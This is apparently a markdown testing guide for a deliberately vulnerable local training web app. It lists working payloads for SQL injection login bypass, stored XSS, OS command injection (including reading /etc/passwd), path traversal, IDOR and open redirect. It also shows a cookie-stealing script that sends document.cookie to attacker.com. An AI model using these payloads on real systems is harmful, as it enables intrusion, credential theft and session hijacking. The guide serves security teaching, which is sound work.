# 🧪 Vulnerability Testing Guide

This guide provides step-by-step instructions to test each vulnerability in the Vulnerable Task Manager application.

## Prerequisites

- Application running on http://localhost:3000
- A web browser (Chrome, Firefox, Edge, etc.)
- Optional: Browser DevTools for inspecting requests/responses

---

## Test 1: SQL Injection

### Bypass Authentication

**Steps**:
1. Navigate to http://localhost:3000/login
2. In the Username field, enter: `' OR '1'='1`
3. In the Password field, enter: `' OR '1'='1`
4. Click "Login"

**Expected Result**: You should be logged in without valid credentials, likely as the first user in the database (admin).

**Why it works**: The SQL query becomes:
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1'
```
The condition `'1'='1'` is always true, bypassing authentication.

### Alternative Payloads to Try:
- Username: `admin'--` (SQL comment injection)
- Username: `' OR 1=1--`
- Username: `admin' OR '1'='1`

---

## Test 2: Stored XSS (Cross-Site Scripting)

### Basic Alert Box

**Steps**:
1. Login with any account (e.g., user/user123)
2. Go to Dashboard
3. In the "Add New Task" form, enter: `<script>alert('XSS')</script>`
4. Click "Add Task"

**Expected Result**: An alert box with "XSS" should appear when the page reloads.

### Advanced XSS Payloads to Try:

**Image Tag with Error Event**:
```html
<img src=x onerror=alert('XSS')>
```

**SVG with onload**:
```html
<svg onload=alert('XSS')>
```

**Steal Cookies (Educational)**:
```html
<script>alert(document.cookie)</script>
```

**Redirect to Another Page**:
```html
<script>window.location='http://google.com'</script>
```

**HTML Injection**:
```html
<h1 style="color:red;">HACKED!</h1>
```

**Event Handler**:
```html
<body onload=alert('XSS')>
```

---

## Test 3: OS Command Injection

### Windows Commands

**Steps**:
1. Login and go to http://localhost:3000/admin
2. Try the following payloads in the "Website to Ping" field:

**List Directory**:
```
google.com & dir
```

**Show Current User**:
```
google.com & whoami
```

**Read Server File**:
```
google.com & type server.js
```

**Show Network Configuration**:
```
google.com & ipconfig
```

**List Environment Variables**:
```
google.com & set
```

### Linux/Mac Commands

**List Directory**:
```
google.com; ls -la
```

**Show Current User**:
```
google.com; whoami
```

**Read Server File**:
```
google.com; cat server.js
```

**Show System Info**:
```
google.com; uname -a
```

**Read /etc/passwd**:
```
google.com; cat /etc/passwd
```

### Alternative Command Separators:
- `&` - Runs both commands (Windows)
- `;` - Runs both commands (Unix)
- `&&` - Runs second command only if first succeeds
- `||` - Runs second command only if first fails
- `|` - Pipes output of first command to second

---

## Test 4: Path Traversal

### Windows Paths

**Steps**:
1. Login and go to http://localhost:3000/view-log

**Read Package.json**:
```
http://localhost:3000/view-log?file=package.json
```

**Read Server Source Code**:
```
http://localhost:3000/view-log?file=server.js
```

**Read Windows Hosts File**:
```
http://localhost:3000/view-log?file=..\..\..\..\Windows\System32\drivers\etc\hosts
```

**Read System Files (Try different depth levels)**:
```
http://localhost:3000/view-log?file=..\..\..\..\..\Windows\win.ini
```

### Linux/Mac Paths

**Read /etc/passwd**:
```
http://localhost:3000/view-log?file=../../../../etc/passwd
```

**Read /etc/hosts**:
```
http://localhost:3000/view-log?file=../../../../etc/hosts
```

### Testing Tips:
- Try different numbers of `../` to traverse up directories
- Use both forward slashes `/` and backslashes `\`
- Try URL encoding: `%2e%2e%2f` instead of `../`

---

## Test 5: IDOR (Insecure Direct Object Reference)

### Access Other Users' Profiles

**Steps**:
1. Login as `user` (username: user, password: user123)
2. Go to http://localhost:3000/profile
3. You'll see user's profile (ID: 2)

**View Admin's Profile**:
```
http://localhost:3000/profile?id=1
```

**View Alice's Profile**:
```
http://localhost:3000/profile?id=3
```

**Expected Result**: You can view any user's profile including their email and **plain text password**!

### What to Notice:
- You can see other users' sensitive information
- Passwords are stored in plain text
- No authorization check is performed
- Any authenticated user can access any profile

---

## Test 6: Open Redirect

### Redirect to External Site

**Steps**:
1. Logout if logged in
2. Visit this URL:
```
http://localhost:3000/login?redirectUrl=http://google.com
```
3. Login with valid credentials (e.g., user/user123)

**Expected Result**: After successful login, you'll be redirected to google.com instead of the dashboard.

### Alternative Test URLs:

**Redirect to Evil Site**:
```
http://localhost:3000/login?redirectUrl=http://evil.com
```

**Redirect with JavaScript**:
```
http://localhost:3000/login?redirectUrl=javascript:alert('XSS')
```

### Real-World Attack Scenario:
An attacker could send victims an email:
"Your account needs verification, please login: http://localhost:3000/login?redirectUrl=http://phishing-site.com"

After the victim logs in, they're redirected to a fake site that looks identical but steals their credentials.

---

## Test 7: Plain Text Password Storage

### View Stored Passwords

**Steps**:
1. Login with any account
2. Go to http://localhost:3000/profile
3. Notice the password is displayed in plain text

**View All Passwords**:
Use the IDOR vulnerability to view all users' passwords:
- http://localhost:3000/profile?id=1 (admin: admin123)
- http://localhost:3000/profile?id=2 (user: user123)
- http://localhost:3000/profile?id=3 (alice: password)

**Why This is Dangerous**:
- If the database is compromised, all passwords are exposed
- No password hashing or salting
- Violates security best practices
- Against most compliance standards (PCI-DSS, GDPR, etc.)

---

## Combined Attack Scenarios

### Scenario 1: Full Account Takeover
1. Use SQL injection to login: `' OR '1'='1`
2. Use IDOR to view all user profiles and their passwords: `/profile?id=1`, `/profile?id=2`, etc.
3. Now you have all usernames and passwords

### Scenario 2: XSS + Cookie Stealing
1. Add a task with: `<script>fetch('http://attacker.com/?cookie='+document.cookie)</script>`
2. When other users view the dashboard, their cookies are sent to the attacker
3. Attacker can use stolen cookies to impersonate users

### Scenario 3: Command Injection for Reconnaissance
1. Use command injection to list files: `google.com & dir`
2. Read sensitive files: `google.com & type server.js`
3. Discover database connection strings, API keys, etc.

---

## Verification Checklist

Use this checklist to verify all vulnerabilities are working:

- [ ] SQL Injection: Can login with `' OR '1'='1`
- [ ] Stored XSS: Alert box appears after adding `<script>alert('XSS')</script>`
- [ ] Command Injection: Can execute `dir` or `ls` command
- [ ] Path Traversal: Can read `package.json` via URL parameter
- [ ] IDOR: Can view other users' profiles by changing ID
- [ ] Open Redirect: Can redirect to external site via query parameter
- [ ] Plain Text Passwords: Passwords visible in profile page

---

## Security Testing Tools (Optional)

For more advanced testing, consider using:

- **Burp Suite** - Web application security testing
- **OWASP ZAP** - Automated vulnerability scanner
- **SQLMap** - Automated SQL injection tool
- **XSSer** - Automated XSS detection
- **Nikto** - Web server scanner

---

## Important Notes

⚠️ **Warning**: 
- Only test on your local instance
- Never perform these attacks on production systems
- Never test vulnerabilities on systems you don't own
- This is for educational purposes only

🎓 **Learning Tip**:
After successfully exploiting each vulnerability, try to understand:
1. Why the vulnerability exists
2. What the attacker can achieve
3. How to fix it properly
4. How to prevent it in future code

---

## Next Steps

After testing all vulnerabilities:
1. Review the code in server.js to understand the vulnerable patterns
2. Try to fix each vulnerability
3. Test again to ensure your fixes work
4. Compare your fixes with security best practices
5. Learn about security libraries and frameworks that can help

Happy (ethical) hacking! 🔐
